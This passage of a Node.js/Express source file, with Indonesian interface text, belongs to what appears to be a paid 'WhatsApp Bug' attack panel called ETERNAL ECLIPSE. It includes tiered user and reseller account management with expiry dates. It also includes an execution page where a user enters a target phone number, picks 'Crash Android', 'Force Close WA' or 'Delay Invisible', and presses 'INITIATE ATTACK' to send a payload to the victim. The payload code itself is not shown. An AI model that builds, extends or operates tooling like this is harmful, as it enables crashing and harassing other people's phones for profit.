      color: #fff; 
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      background-image: 
          radial-gradient(circle at 50% 50%, rgba(50, 205, 50, 0.08) 0%, transparent 70%),
          radial-gradient(circle at 0% 0%, rgba(173, 255, 47, 0.05) 0%, transparent 50%);
    }

    body::before {
      content: "";
      position: absolute;
      width: 500px;
      height: 500px;
      border: 1px solid rgba(50, 205, 50, 0.1);
      border-radius: 50%;
      z-index: 0;
      animation: pulseRing 4s infinite;
    }

    .error { 
      position: relative;
      z-index: 1;
      background: rgba(15, 15, 15, 0.7); 
      backdrop-filter: blur(30px);
      -webkit-backdrop-filter: blur(30px);
      padding: 60px 40px; 
      border-radius: 40px; 
      border: 1px solid var(--glass-border);
      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 
                  inset 0 0 30px rgba(50, 205, 50, 0.05);
      max-width: 450px;
      width: 90%;
      text-align: center;
      animation: scaleIn 0.5s cubic-bezier(0.23, 1, 0.32, 1);
    }

    .error-header-line {
      position: absolute;
      top: 0; left: 50%;
      transform: translateX(-50%);
      width: 100px;
      height: 4px;
      background: var(--primary);
      box-shadow: 0 0 20px var(--primary);
      border-radius: 0 0 10px 10px;
    }

    .icon-error {
      font-size: 60px;
      color: var(--primary);
      margin-bottom: 25px;
      filter: drop-shadow(0 0 15px var(--glow));
      animation: iconShake 2s infinite;
    }

    h2 {
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 20px;
      margin-bottom: 20px;
      letter-spacing: 2px;
      text-transform: uppercase;
      color: #fff;
    }

    p {
      color: rgba(255, 255, 255, 0.6);
      line-height: 1.8;
      font-size: 15px;
      margin-bottom: 15px;
    }

    strong {
      color: var(--accent);
      background: rgba(50, 205, 50, 0.1);
      padding: 4px 10px;
      border-radius: 8px;
      font-family: 'Orbitron', sans-serif;
      font-size: 13px;
      border: 1px solid rgba(50, 205, 50, 0.2);
    }

    .btn-back {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      margin-top: 35px;
      padding: 18px 35px;
      background: linear-gradient(135deg, #ffffff 0%, #e0e0e0 100%);
      color: #000000;
      text-decoration: none;
      border-radius: 20px;
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 13px;
      letter-spacing: 1px;
      transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
      border: none;
    }

    .btn-back:hover {
      transform: translateY(-5px);
      box-shadow: 0 15px 30px rgba(50, 205, 50, 0.3);
      background: var(--accent);
      filter: brightness(1.1);
    }

    .btn-back:active {
      transform: scale(0.95);
    }

    .link-list {
      color: var(--primary);
      text-decoration: none;
      font-weight: 600;
      border-bottom: 1px solid transparent;
      transition: 0.3s;
    }

    .link-list:hover {
      color: #fff;
      border-bottom-color: var(--primary);
      text-shadow: 0 0 10px var(--primary);
    }

    @keyframes scaleIn {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }

    @keyframes pulseRing {
      0% { transform: scale(0.8); opacity: 0.5; }
      50% { transform: scale(1.1); opacity: 0.2; }
      100% { transform: scale(0.8); opacity: 0.5; }
    }

    @keyframes iconShake {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
  </style>
</head>
<body>

  <div class="error">
    <div class="error-header-line"></div>
    <div class="icon-error">
      <i class="fas fa-user-slash"></i>
    </div>
    <h2>Data Not Found</h2>
    <p>User dengan username <strong>"${targetUsername}"</strong> tidak terdeteksi dalam database pusat.</p>
    <p>Silakan kembali ke <a href="/userlist" class="link-list">Main Directory</a></p>
    
    <a href="/userlist" class="btn-back">
      <i class="fas fa-arrow-left"></i> RE-SYNC DATABASE
    </a>
  </div>

</body>
</html>
    `;
    return res.send(errorHtml);
  }

  if (targetUsername === currentUsername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  if (targetUser.role === 'developer') {
    return res.send("❌ Tidak bisa edit Developer.");
  }

  if (role === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  if (role === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
    if (targetUser.role === "developer") {
      return res.send("❌ Admin tidak bisa edit developer.");
    }
  }

  if (role === "owner" && targetUser.role === "owner") {
    return res.send("❌ Owner tidak bisa edit owner lain.");
  }

  let roleOptions = "";
  if (role === "developer") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${targetUser.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${targetUser.role === "owner" ? 'selected' : ''}>Owner</option>
      <option value="developer" ${targetUser.role === "developer" ? 'selected' : ''}>Developer</option>
    `;
  } else if (role === "owner") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${targetUser.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${targetUser.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
    `;
  } else {
    roleOptions = `<option value="${targetUser.role}" selected>${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((targetUser.expired - now) / 86400000));
  const expiredText = new Date(targetUser.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  const html = `
  <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Edit User - ETERNAL ECLIPSE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Rajdhani:wght@500;600;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    
    <style>
        :root {
            --primary: #32CD32;
            --accent: #adff2f;
            --danger: #ff453a;
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background: #050505;
            color: #FFFFFF;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 50% -20%, rgba(50, 205, 50, 0.15) 0%, transparent 50%);
        }

        #particles {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 0;
            opacity: 0.4;
        }

        .content {
            position: relative;
            z-index: 2;
            width: 100%;
            max-width: 480px;
            animation: fadeInUp 0.8s ease-out;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 32px;
            letter-spacing: 4px;
            background: linear-gradient(to right, #fff, var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
            filter: drop-shadow(0 0 10px rgba(50, 205, 50, 0.3));
        }

        .header p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .form-container {
            background: rgba(15, 15, 15, 0.6);
            backdrop-filter: blur(25px) saturate(200%);
            -webkit-backdrop-filter: blur(25px) saturate(200%);
            border: 1px solid var(--glass-border);
            padding: 30px;
            border-radius: 35px;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7);
            position: relative;
            overflow: hidden;
        }

        .form-container::before {
            content: "";
            position: absolute;
            top: 0; left: 50%;
            transform: translateX(-50%);
            width: 60%; height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
        }

        .user-info {
            background: rgba(255, 255, 255, 0.03);
            padding: 20px;
            border-radius: 20px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 13px;
            font-family: 'Rajdhani', sans-serif;
        }

        .info-label { color: rgba(255, 255, 255, 0.4); text-transform: uppercase; letter-spacing: 1px; }
        .info-value { color: #FFFFFF; font-weight: 600; letter-spacing: 0.5px; }

        .role-badge {
            padding: 4px 12px;
            border-radius: 8px;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            box-shadow: 0 0 15px rgba(0,0,0,0.3);
        }

        .role-developer { background: linear-gradient(45deg, #00ff00, #00cc00); color: #000; }
        .role-owner { background: linear-gradient(45deg, #FFD700, #FFA500); color: #000; }
        .role-admin { background: linear-gradient(45deg, #FF4B2B, #FF416C); color: #fff; }
        .role-reseller { background: linear-gradient(45deg, #32CD32, #228B22); color: #fff; }
        .role-user { background: linear-gradient(45deg, #adff2f, #32CD32); color: #fff; }

        .form-group { margin-bottom: 22px; }

        label {
            display: block;
            margin-left: 10px;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--primary);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-family: 'Orbitron', sans-serif;
        }

        input, select {
            width: 100%;
            padding: 16px 20px;
            border-radius: 18px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            background: rgba(255, 255, 255, 0.04);
            color: #FFFFFF;
            font-size: 15px;
            transition: all 0.3s ease;
            font-family: 'Poppins', sans-serif;
        }

        input:focus, select:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.08);
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(50, 205, 50, 0.2);
        }

        .button-group {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 30px;
        }

        .btn {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 20px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 12px;
            letter-spacing: 2px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            text-transform: uppercase;
        }

        .btn:active { transform: scale(0.96); }

        .btn-save {
            background: linear-gradient(45deg, #fff, #f0f0f0);
            color: #000;
            box-shadow: 0 10px 20px rgba(255, 255, 255, 0.1);
        }

        .btn-save:hover {
            background: var(--primary);
            color: #000;
            box-shadow: 0 15px 30px rgba(50, 205, 50, 0.3);
            transform: translateY(-2px);
        }

        .btn-delete {
            background: rgba(255, 69, 58, 0.05);
            color: var(--danger);
            border: 1px solid rgba(255, 69, 58, 0.2);
        }

        .btn-delete:hover {
            background: var(--danger);
            color: #fff;
            box-shadow: 0 10px 20px rgba(255, 69, 58, 0.3);
        }

        .btn-back {
            background: transparent;
            color: rgba(255, 255, 255, 0.4);
            font-size: 10px;
            border: 1px solid rgba(255,255,255,0.05);
            text-decoration: none;
        }

        .btn-back:hover {
            color: #fff;
            background: rgba(255,255,255,0.05);
            border-color: #fff;
        }

        .warning-text { color: var(--danger) !important; text-shadow: 0 0 10px rgba(255, 69, 58, 0.4); }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
    </style>
</head>
<body>
    <div id="particles"></div>

    <div class="content">
        <div class="header">
            <h2>EDIT MODULE</h2>
            <p>Access Level: System Administrator</p>
        </div>

        <div class="form-container">
            <div class="user-info">
                <div class="info-row">
                    <span class="info-label">Identity:</span>
                    <span class="info-value">${targetUser.username}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Current Tier:</span>
                    <span class="info-value">
                        <span class="role-badge role-${targetUser.role}">
                            ${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}
                        </span>
                    </span>
                </div>
                <div class="info-row">
                    <span class="info-label">Termination Date:</span>
                    <span class="info-value">${expiredText}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Active Status:</span>
                    <span class="info-value ${sisaHari <= 7 ? 'warning-text' : ''}">${sisaHari} Cycles Left</span>
                </div>
            </div>

            <form method="POST" action="/edituser">
                <input type="hidden" name="oldusername" value="${targetUser.username}">
                
                <div class="form-group">
                    <label><i class="fas fa-fingerprint"></i> New Identity</label>
                    <input type="text" name="username" value="${targetUser.username}" required>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-terminal"></i> Access Code</label>
                    <input type="text" name="password" value="${targetUser.key}" required>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-hourglass-half"></i> Extend Lifespan (Days)</label>
                    <input type="number" name="extend" min="0" max="365" placeholder="0" value="0">
                </div>

                <div class="form-group">
                    <label><i class="fas fa-shield-halved"></i> Security Protocol</label>
                    <select name="role" ${role === 'reseller' ? 'disabled' : ''}>
                        ${roleOptions}
                    </select>
                    ${role === 'reseller' ? '<input type="hidden" name="role" value="' + targetUser.role + '">' : ''}
                </div>

                <div class="button-group">
                    <button type="submit" class="btn btn-save">
                        <i class="fas fa-save"></i> Commit Changes
                    </button>

                    <button type="button" class="btn btn-delete" onclick="handleDelete()">
                        <i class="fas fa-trash-can"></i> Purge User
                    </button>

                    <a href="/userlist" class="btn btn-back">
                        <i class="fas fa-arrow-left"></i> Abort & Return
                    </a>
                </div>
            </form>
        </div>
    </div>

    <form id="deleteForm" method="POST" action="/hapususer" style="display: none;">
        <input type="hidden" name="username" value="${targetUser.username}">
    </form>

    <script>
        $(document).ready(function() {
            $('#particles').particleground({
                dotColor: '#1a4d1a',
                lineColor: '#1a4d1a',
                density: 10000,
                proximity: 100
            });
        });

        function handleDelete() {
            if (confirm('Critical Warning: Are you sure you want to purge user ${targetUser.username}? This action is irreversible.')) {
                document.getElementById('deleteForm').submit();
            }
        }
    </script>
</body>
</html>
  `;
  res.send(html);
});

app.post("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { oldusername, username: newUsername, password, role, extend } = req.body;

  if (!oldusername || !newUsername || !password || !role) {
    return res.send("❌ Semua field harus diisi.");
  }

  const targetUserIndex = users.findIndex(u => u.username === oldusername);
  if (targetUserIndex === -1) {
    return res.send("❌ User tidak ditemukan.");
  }

  const targetUser = users[targetUserIndex];

  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  if (targetUser.role === 'developer') {
    return res.send("❌ Tidak bisa edit Developer.");
  }

  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
    if (targetUser.role === "developer") {
      return res.send("❌ Admin tidak bisa edit developer.");
    }
  }

  if (sessionRole === "owner" && targetUser.role === "owner") {
    return res.send("❌ Owner tidak bisa edit owner lain.");
  }

  users[targetUserIndex] = {
    ...users[targetUserIndex],
    username: newUsername,
    key: password,
    role: role
  };

  if (extend && parseInt(extend) > 0) {
    users[targetUserIndex].expired += parseInt(extend) * 86400000;
  }

  saveUsers(users);
  
  res.redirect("/userlist?msg=User " + newUsername + " berhasil diupdate");
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isDeveloper,
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  const bugTypes = [
    {
      id: 'delay',
      icon: '<i class="fas fa-hourglass-half"></i>',
      title: 'Delay Invisible'
    },
    {
      id: 'crash',
      icon: '<i class="fas fa-tachometer-alt"></i>',
      title: 'Crash Android'
    },
    {
      id: 'fcandro',
      icon: '<i class="fab fa-android"></i>',
      title: 'Force Close'
    }
  ];

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Bug Dashboard - Execution</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-dark: #07030a;
            --card-bg: #111a11;
            --accent-pink: #32ff7e;
            --accent-purple: #3ae374;
            --text-main: #ffffff;
            --text-dim: #a1a1aa;
            --gradient-pink: linear-gradient(90deg, #32ff7e, #3ae374);
            --danger-yellow: #f59e0b;
            --success-green: #10b981;
        }

        body {
            font-family: 'Rajdhani', sans-serif;
            background: var(--bg-dark);
            color: var(--text-main);
            padding: 20px;
            padding-bottom: 80px;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 450px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .profile-card {
            background: var(--card-bg);
            border-radius: 20px;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid rgba(50, 255, 126, 0.15);
        }

        .profile-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .avatar {
            width: 45px;
            height: 45px;
            border-radius: 50%;
            border: 2px solid var(--accent-pink);
            object-fit: cover;
        }

        .user-meta h2 {
            font-size: 1.1rem;
            letter-spacing: 1px;
        }

        .role-badge {
            font-size: 9px;
            background: rgba(50, 255, 126, 0.2);
            color: #32ff7e;
            padding: 1px 6px;
            border-radius: 4px;
            text-transform: uppercase;
            font-weight: bold;
        }

        .expiry-box {
            text-align: right;
            font-size: 9px;
            color: #fbbf24;
            background: rgba(0,0,0,0.3);
            padding: 4px 8px;
            border-radius: 6px;
        }

        .banner-card {
            width: 100%;
            height: 170px;
            border-radius: 20px;
            overflow: hidden;
            position: relative;
            border: 1px solid rgba(50, 255, 126, 0.2);
            background: #000;
        }

        .banner-card video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .sound-toggle {
            position: absolute;
            top: 10px;
            right: 10px;
            width: 32px;
            height: 32px;
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid var(--accent-pink);
            border-radius: 50%;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 10;
            transition: 0.3s;
        }

        .banner-overlay {
            position: absolute;
            bottom: 0;
            width: 100%;
            padding: 15px;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
            pointer-events: none; 
        }

        .banner-text {
            font-family: 'Orbitron', sans-serif;
            font-size: 13px;
            font-weight: bold;
            color: white;
        }

        .section-label {
            background: var(--gradient-pink);
            padding: 8px 15px;
            border-radius: 12px 12px 0 0;
            font-family: 'Orbitron', sans-serif;
            font-size: 13px;
            font-weight: bold;
            color: #000; 
        }

        .input-wrapper {
            background: var(--card-bg);
            border-radius: 0 0 15px 15px;
            padding: 18px;
            display: flex;
            align-items: center;
            gap: 15px;
            border: 1px solid rgba(50, 255, 126, 0.1);
        }

        .input-field {
            background: transparent;
            border: none;
            color: white;
            font-size: 15px;
            outline: none;
            width: 100%;
        }

        .dropdown-container {
            position: relative;
        }

        .select-box {
            background: #152415;
            padding: 18px;
            border-radius: 0 0 15px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            transition: 0.3s;
            border: 1px solid rgba(50, 255, 126, 0.05);
        }

        .bug-dropdown-list {
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: #111a11;
            margin-top: 5px;
            border-radius: 12px;
            border: 1px solid rgba(50, 255, 126, 0.3);
            z-index: 999;
            display: none;
            max-height: 200px;
            overflow-y: auto;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }

        .bug-dropdown-list.active {
            display: block;
        }

        .bug-dropdown-list::-webkit-scrollbar {
            width: 6px;
        }
        .bug-dropdown-list::-webkit-scrollbar-thumb {
            background: var(--accent-pink);
            border-radius: 10px;
        }

        .bug-item {
            padding: 15px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 1px solid rgba(255,255,255,0.03);
            transition: 0.2s;
        }

        .bug-item:hover {
            background: rgba(50, 255, 126, 0.1);
        }

        .execute-btn {
            background: var(--gradient-pink);
            border: none;
            padding: 16px;
            border-radius: 12px;
            color: #000;
            font-family: 'Orbitron', sans-serif;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 4px 15px rgba(50, 255, 126, 0.3);
            transition: 0.3s;
        }

        .execute-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            filter: grayscale(1);
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(5px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            padding: 20px;
        }

        .modal-content {
            background: var(--card-bg);
            width: 100%;
            max-width: 350px;
            border-radius: 20px;
            border: 1px solid var(--accent-pink);
            overflow: hidden;
            animation: popupAnim 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes popupAnim {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .modal-header {
            background: var(--gradient-pink);
            padding: 15px;
            text-align: center;
            font-family: 'Orbitron', sans-serif;
            font-weight: bold;
            font-size: 16px;
            color: #000;
        }

        .modal-body {
            padding: 20px;
            text-align: center;
            color: var(--text-dim);
            line-height: 1.6;
        }

        .modal-footer {
            padding: 15px;
            display: flex;
            justify-content: center;
        }

        .close-modal-btn {
            background: transparent;
            border: 1px solid var(--accent-pink);
            color: var(--accent-pink);
            padding: 8px 25px;
            border-radius: 10px;
            cursor: pointer;
            font-family: 'Orbitron', sans-serif;
            font-size: 11px;
        }

        .modal-content.error { border-color: var(--danger-yellow); }
        .modal-content.error .modal-header { background: var(--danger-yellow); color: white; }
        .modal-content.success { border-color: var(--success-green); }
        .modal-content.success .modal-header { background: var(--success-green); color: white; }

        .bottom-nav {
            position: fixed;
            bottom: 0;
            width: 100%;
            max-width: 450px;
            background: #000;
            display: flex;
            justify-content: space-around;
            padding: 12px;
            border-top: 1px solid #1a1a1a;
        }

        .nav-item {
            text-align: center;
            font-size: 10px;
            color: #444;
            text-decoration: none;
            flex: 1;
        }

        .nav-item.active { color: var(--accent-pink); }
        .nav-item i { display: block; font-size: 1.2rem; margin-bottom: 4px; }
    </style>
</head>
<body>

    <div class="container">
        <div class="profile-card">
            <div class="profile-info">
                <img src="https://e.top4top.io/p_364583zcu1.jpg" class="avatar" alt="Avatar">
                <div class="user-meta">
                    <h2 id="userName">${username}</h2>
                    <span class="role-badge">ETERNAL ECLIPSE</span>
                </div>
            </div>
            <div class="expiry-box">EXPIRES<br><span id="expiryDate">${formattedTime}</span></div>
        </div>

        <div class="banner-card">
            <video id="bannerVideo" autoplay muted loop playsinline>
                <source src="https://a.top4top.io/m_3644qg30k1.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
            
            <div class="sound-toggle" id="soundBtn">
                <i id="soundIcon" class="fas fa-volume-mute"></i>
            </div>

            <div class="banner-overlay">
                <div class="banner-text">One Tap, One Dead</div>
            </div>
        </div>

        <div>
            <div class="section-label">Number Targets</div>
            <div class="input-wrapper">
                <i class="fas fa-mobile-alt" style="color:var(--accent-pink)"></i>
                <input type="text" id="numberInput" class="input-field" placeholder="Masukkan nomor (Contoh: 628xxx)">
            </div>
        </div>

        <div class="dropdown-container">
            <div class="section-label">Pilih Bug</div>
            <div class="select-box" id="menuToggle">
                <div style="display:flex; align-items:center; gap:10px">
                    <i class="fas fa-chart-bar" style="color:var(--accent-pink)"></i>
                    <span id="selectedBugLabel">Select Type</span>
                </div>
                <i class="fas fa-caret-down"></i>
            </div>
            <div class="bug-dropdown-list" id="bugDropdown">
            </div>
        </div>

        <button id="executeBtn" class="execute-btn">
            <i class="fas fa-radiation"></i> INITIATE ATTACK
        </button>
    </div>

    <div class="modal-overlay" id="customModal">
        <div class="modal-content" id="modalContent">
            <div class="modal-header" id="modalTitle">NOTIFIKASI</div>
            <div class="modal-body" id="modalMessage">Pesan disini...</div>
            <div class="modal-footer">
                <button class="close-modal-btn" onclick="closeModal()">UNDERSTOOD</button>
            </div>
        </div>
    </div>

    <div class="bottom-nav">
        <a href="/dashboard" class="nav-item"><i class="fas fa-home"></i>Home</a>
        <a href="/execution" class="nav-item active"><i class="fab fa-whatsapp"></i>WhatsApp</a>
        <a href="/tools" class="nav-item"><i class="fas fa-tools"></i>Tools</a>
    </div>

    <script>
        const bugTypes = [
            { id: 'delay', icon: 'fab fa-android', title: 'Delay Invisible' },
            { id: 'crash', icon: 'fas fa-hourglass-half', title: 'Crash Android' },
            { id: 'fcandro', icon: 'fas fa-skull', title: 'Force Close WA' }
        ];

        let selectedBugType = null;
        const bugDropdown = document.getElementById('bugDropdown');
        const menuToggle = document.getElementById('menuToggle');
        const selectedBugLabel = document.getElementById('selectedBugLabel');
        const executeBtn = document.getElementById('executeBtn');

        const bannerVideo = document.getElementById('bannerVideo');
        const soundBtn = document.getElementById('soundBtn');
        const soundIcon = document.getElementById('soundIcon');

        soundBtn.onclick = () => {
            if (bannerVideo.muted) {
                bannerVideo.muted = false;
                soundIcon.classList.replace('fa-volume-mute', 'fa-volume-up');
            } else {
                bannerVideo.muted = true;
                soundIcon.classList.replace('fa-volume-up', 'fa-volume-mute');
            }
        };

        function initBugList() {
            bugTypes.forEach(bug => {
                const item = document.createElement('div');
                item.className = 'bug-item';
                item.innerHTML = \`<i class="\${bug.icon}" style="color:var(--accent-pink); width:20px"></i> <span>\${bug.title}</span>\`;
                item.onclick = (e) => {
                    e.stopPropagation();
                    selectedBugType = bug.id;
                    selectedBugLabel.innerText = bug.title;
                    bugDropdown.classList.remove('active');
                };
                bugDropdown.appendChild(item);
            });
        }

        menuToggle.onclick = (e) => {
            e.stopPropagation();
            bugDropdown.classList.toggle('active');
        };

        window.onclick = () => { bugDropdown.classList.remove('active'); };

        function showPopup(type, title, message) {
            const modal = document.getElementById('customModal');
            const content = document.getElementById('modalContent');
            content.className = 'modal-content ' + type;
            document.getElementById('modalTitle').innerHTML = title;
            document.getElementById('modalMessage').innerHTML = message;
            modal.style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
        }

        executeBtn.onclick = async function() {
            const num = document.getElementById('numberInput').value.trim();
            
            if (!num) {
                showPopup('error', '<i class="fas fa-exclamation-triangle"></i> ERROR', 'Harap isi <b>Nomor Target</b> sebelum eksekusi!');
                return;
            }

            if (!selectedBugType) {
                showPopup('error', '<i class="fas fa-bug"></i> ERROR', 'Silakan pilih <b>Bug Type</b> terlebih dahulu!');
                return;
            }

            this.disabled = true;
            this.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> EXECUTING...';

            try {
                const response = await fetch('/execution', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        target: num,
                        mode: selectedBugType
                    })
                });

                const data = await response.json();

                if (data.success) {
                    showPopup('success', '<i class="fas fa-check-circle"></i> SUCCESS', 
                        \`Payload <b>\${selectedBugType.toUpperCase()}</b> telah berhasil diinjeksi ke nomor <b>\${num}</b>.\`);
                } else {
                    showPopup('error', '<i class="fas fa-times-circle"></i> FAILED', 
                        data.error || 'Terjadi kesalahan sistem saat pengiriman payload.');
                }

            } catch (error) {
                console.error('Execution Error:', error);
                showPopup('error', '<i class="fas fa-wifi"></i> NETWORK ERROR', 
                    'Gagal terhubung ke server. Pastikan koneksi internet stabil.');
            } finally {
                this.disabled = false;
                this.innerHTML = '<i class="fas fa-radiation"></i> INITIATE ATTACK';
            }
        };

        document.addEventListener('DOMContentLoaded', () => {
            initBugList();
        });
    </script>
</body>
</html>`;
};